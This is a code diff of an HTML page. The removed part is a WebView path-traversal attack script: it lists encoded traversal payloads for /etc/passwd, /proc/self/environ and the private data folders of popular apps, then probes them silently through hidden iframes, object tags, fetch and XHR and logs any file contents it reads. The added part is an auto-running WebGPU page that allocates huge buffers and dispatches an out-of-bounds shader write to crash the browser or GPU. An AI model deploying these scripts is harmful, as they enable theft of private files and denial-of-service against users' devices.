@@ -1,300 +1,61 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>WebGPU Crash Test - Auto Run</title>
+</head>
 <body>
-<h3 style="display:none">Loading...</h3>
-<script>
-// ===========================================
-// ANDROID WEBVIEW PATH TRAVERSAL TEST SUITE
-// Tests for file:// URI sanitization bypasses
-// ===========================================
+    <h1>WebGPU Crash Test (Auto Run)</h1>
+    <canvas id="canvas" width="1024" height="1024"></canvas>
+    <script>
+        (async function() {
+            if (!navigator.gpu) {
+                console.log("WebGPU not available");
+                return;
+            }
+            try {
+                const adapter = await navigator.gpu.requestAdapter();
+                const device = await adapter.requestDevice();
 
-(function() {
-    'use strict';
-    
-    console.log('[*] Starting Path Traversal tests...');
-    
-    // ============ TECHNIQUE 1: BASIC TRAVERSAL ============
-    const traversalPayloads = [
-        // Standard traversal
-        '../../../etc/hosts',
-        '../../../../etc/hosts',
-        '../../../../../etc/hosts',
-        
-        // URL encoded
-        '%2e%2e%2fetc%2fhosts',
-        '%252e%252e%252fetc%252fhosts',
-        '..%2f..%2f..%2fetc%2fhosts',
-        
-        // Unicode/UTF-8 variants
-        '．．／etc/hosts',  // Fullwidth dots
-        '..%c0%afetc%c0%afhosts',  // Overlong UTF-8
-        
-        // Mixed encoding
-        '..%252f..%252f..%252fetc/passwd',
-        '..%255c..%255c..%255cwindows/win.ini',
-        
-        // Android specific paths
-        '../../../../data/data/com.android.providers.settings/databases/settings.db',
-        '../../../../data/local/tmp/',
-        '../../../../storage/emulated/0/',
-        '../../../../sdcard/',
-        
-        // Null byte injection (old Android)
-        '../../../etc/hosts%00test',
-        '../../../../etc/hosts%00.jpg',
-        
-        // Parameter pollution
-        'file:///data/data/com.test.app/shared_prefs/test.xml?../../../../etc/hosts',
-        'file:///data/data/com.test.app/../../../../etc/hosts',
-        
-        // Symlink tricks
-        '../../../../proc/self/fd/0',
-        '../../../../proc/self/cmdline',
-        '../../../../proc/self/environ',
-        
-        // WebView specific
-        '/data/data/com.test.app/../../../../etc/hosts',
-        'file:///data/data/com.test.app/..%2f..%2f..%2f..%2fetc%2fhosts',
-        
-        // Fragment/combo attacks
-        '../../../etc/hosts#test',
-        '../../../etc/hosts?test=1'
-    ];
+                const buffers = [];
+                for (let i = 0; i < 500; i++) {
+                    buffers.push(device.createBuffer({
+                        size: 256 * 1024 * 1024,
+                        usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST
+                    }));
+                }
 
-    // ============ TECHNIQUE 2: IFRAME INJECTION ============
-    function testIframeTraversal() {
-        traversalPayloads.forEach((payload, index) => {
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.width = '1px';
-                iframe.style.height = '1px';
-                iframe.style.opacity = '0.01';
-                iframe.style.position = 'absolute';
-                
-                // Try different schemes
-                const urls = [
-                    `file://${payload}`,
-                    `file:///${payload}`,
-                    `content://media/${payload}`,
-                    `file://${payload.replace('etc', 'system/etc')}`
-                ];
-                
-                urls.forEach(url => {
-                    const testIframe = iframe.cloneNode();
-                    testIframe.src = url;
-                    
-                    testIframe.onload = function() {
-                        console.log(`[!] LOAD SUCCESS: ${url}`);
-                        try {
-                            if (testIframe.contentDocument) {
-                                const content = testIframe.contentDocument.body?.innerHTML || 
-                                              testIframe.contentDocument.documentElement?.innerHTML;
-                                console.log(`[!] CONTENT LENGTH: ${content?.length || 0}`);
-                                if (content?.includes('root') || content?.includes('localhost')) {
-                                    console.log(`[!] POTENTIAL HOSTS FILE: ${url}`);
-                                }
-                            }
-                        } catch(e) {
-                            // Cross-origin access blocked - but load succeeded!
-                            console.log(`[!] LOADED (CORS blocked): ${url}`);
+                const shaderModule = device.createShaderModule({
+                    code: `
+                        @group(0) @binding(0) var<storage, read_write> data : array<u32>;
+                        @compute @workgroup_size(1)
+                        fn main(@builtin(global_invocation_id) id : vec3<u32>) {
+                            data[0x7fffffff] = 0xdeadbeef;
                         }
-                    };
-                    
-                    testIframe.onerror = function() {
-                        // Silent fail - most will hit here
-                    };
-                    
-                    document.body.appendChild(testIframe);
-                    setTimeout(() => {
-                        try { document.body.removeChild(testIframe); } catch(e) {}
-                    }, 500);
+                    `
                 });
-            }, index * 50);
-        });
-    }
 
-    // ============ TECHNIQUE 3: OBJECT/EMBED TAGS ============
-    function testObjectTraversal() {
-        const criticalFiles = [
-            '../../../etc/hosts',
-            '../../../etc/passwd', 
-            '../../../../proc/version',
-            '../../../../proc/self/cmdline',
-            '../../../data/local/tmp/',
-            '../../../../storage/emulated/0/Download/'
-        ];
-        
-        criticalFiles.forEach((file, index) => {
-            setTimeout(() => {
-                const obj = document.createElement('object');
-                obj.type = 'text/plain';
-                obj.data = `file://${file}`;
-                obj.style.display = 'none';
-                
-                obj.onload = () => console.log(`[!] OBJECT LOADED: ${file}`);
-                
-                document.body.appendChild(obj);
-                setTimeout(() => {
-                    try { document.body.removeChild(obj); } catch(e) {}
-                }, 300);
-            }, index * 100);
-        });
-    }
+                const pipeline = device.createComputePipeline({
+                    layout: 'auto',
+                    compute: { module: shaderModule, entryPoint: 'main' }
+                });
 
-    // ============ TECHNIQUE 4: FETCH/XHR ATTEMPTS ============
-    function testFetchTraversal() {
-        const xhrTests = [
-            '../../../etc/hosts',
-            '../../../../data/data/com.android.providers.settings/databases/settings.db'
-        ];
-        
-        xhrTests.forEach(path => {
-            const url = `file://${path}`;
-            
-            // Try XHR
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', url, true);
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        if (xhr.status === 200) {
-                            console.log(`[!] XHR SUCCESS: ${url}`);
-                            console.log(`[!] RESPONSE: ${xhr.responseText?.substring(0, 100)}`);
-                        }
-                    }
-                };
-                xhr.send();
-            } catch(e) {}
-            
-            // Try fetch with no-cors
-            try {
-                fetch(url, { mode: 'no-cors', cache: 'no-store' })
-                    .then(r => console.log(`[!] FETCH SUCCESS: ${url}`))
-                    .catch(() => {});
-            } catch(e) {}
-        });
-    }
+                for (let i = 0; i < buffers.length; i++) {
+                    const bindGroup = device.createBindGroup({
+                        layout: pipeline.getBindGroupLayout(0),
+                        entries: [{ binding: 0, resource: { buffer: buffers[i] } }]
+                    });
+                    const encoder = device.createCommandEncoder();
+                    const pass = encoder.beginComputePass();
+                    pass.setPipeline(pipeline);
+                    pass.setBindGroup(0, bindGroup);
+                    pass.dispatchWorkgroups(0x7fffffff);
+                    pass.end();
+                    device.queue.submit([encoder.finish()]);
+                }
 
-    // ============ TECHNIQUE 5: WEBVIEW SPECIFIC BYPASSES ============
-    function testWebViewBypasses() {
-        // Bypass 1: Scheme confusion
-        const schemeBypasses = [
-            'file:///android_asset/../../../../etc/hosts',
-            'file:///android_res/../../../../etc/hosts',
-            'content://com.android.fileprovider/../shared_prefs/',
-            'file:///storage/emulated/0/../../etc/hosts'
-        ];
-        
-        schemeBypasses.forEach((bypass, i) => {
-            const img = new Image();
-            img.src = bypass;
-            img.onload = () => console.log(`[!] SCHEME BYPASS: ${bypass}`);
-            img.style.display = 'none';
-            document.body.appendChild(img);
-            setTimeout(() => img.remove(), 100);
-        });
-        
-        // Bypass 2: Double encoding
-        const doubleEncode = '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts';
-        const link = document.createElement('link');
-        link.rel = 'prefetch';
-        link.href = `file://${doubleEncode}`;
-        document.head.appendChild(link);
-        setTimeout(() => link.remove(), 100);
-    }
-
-    // ============ TECHNIQUE 6: ERROR-BASED INFERENCE ============
-    function testErrorInference() {
-        // Detect if file:// is even allowed
-        const testPaths = [
-            'file:///data/data/com.test.app/shared_prefs/test.xml',  // Should 404
-            'file:///data/data/com.test.app/',  // Should 403 or 404
-            'file:///system/etc/hosts'  // Might exist
-        ];
-        
-        testPaths.forEach((path, i) => {
-            setTimeout(() => {
-                const start = Date.now();
-                fetch(path, { mode: 'no-cors' })
-                    .finally(() => {
-                        const time = Date.now() - start;
-                        // If request takes >100ms, might be trying to access
-                        if (time > 100) {
-                            console.log(`[*] Timing inference: ${path} took ${time}ms`);
-                        }
-                    })
-                    .catch(() => {});
-            }, i * 50);
-        });
-    }
-
-    // ============ TECHNIQUE 7: APP-SPECIFIC PATHS ============
-    function testAppSpecificPaths() {
-        // Try to identify the current app via error patterns
-        const appPaths = [
-            // YouTube
-            '/data/data/com.google.android.youtube/shared_prefs/youtube.xml',
-            '/data/data/com.google.android.youtube/databases/youtube.db',
-            '/data/data/com.google.android.youtube/cache/',
-            
-            // Instagram
-            '/data/data/com.instagram.android/shared_prefs/',
-            '/data/data/com.instagram.android/databases/',
-            
-            // Facebook
-            '/data/data/com.facebook.katana/shared_prefs/',
-            '/data/data/com.facebook.orca/',
-            
-            // TikTok
-            '/data/data/com.zhiliaoapp.musically/shared_prefs/',
-            
-            // Twitter
-            '/data/data/com.twitter.android/shared_prefs/',
-            
-            // General
-            '/data/data/%package%/shared_prefs/%package%_preferences.xml'
-        ];
-        
-        appPaths.forEach((path, i) => {
-            setTimeout(() => {
-                const traversal = `../../../../..${path}`;
-                const iframe = document.createElement('iframe');
-                iframe.src = `file://${traversal}`;
-                iframe.style.display = 'none';
-                
-                iframe.onload = () => {
-                    console.log(`[!] APP PATH ACCESSIBLE: ${path}`);
-                    // Try to read content
-                    setTimeout(() => {
-                        try {
-                            const content = iframe.contentDocument?.body?.innerText;
-                            if (content) console.log(`[!] CONTENT: ${content.substring(0, 200)}`);
-                        } catch(e) {}
-                    }, 100);
-                };
-                
-                document.body.appendChild(iframe);
-                setTimeout(() => iframe.remove(), 200);
-            }, i * 100);
-        });
-    }
-
-    // ============ EXECUTION ============
-    console.log('[*] Starting Path Traversal tests in 2 seconds...');
-    setTimeout(() => {
-        testIframeTraversal();
-        testObjectTraversal();
-        testFetchTraversal();
-        testWebViewBypasses();
-        testErrorInference();
-        testAppSpecificPaths();
-        
-        console.log('[*] All tests initiated - check console for successes');
-    }, 2000);
-
-})();
-</script>
-
-<!-- Hidden reporting div -->
-<div id="results" style="display:none"></div>
+                // No device.destroy()
+            } catch (e) { console.log(e); }
+        })();
+    </script>
 </body>
 </html>
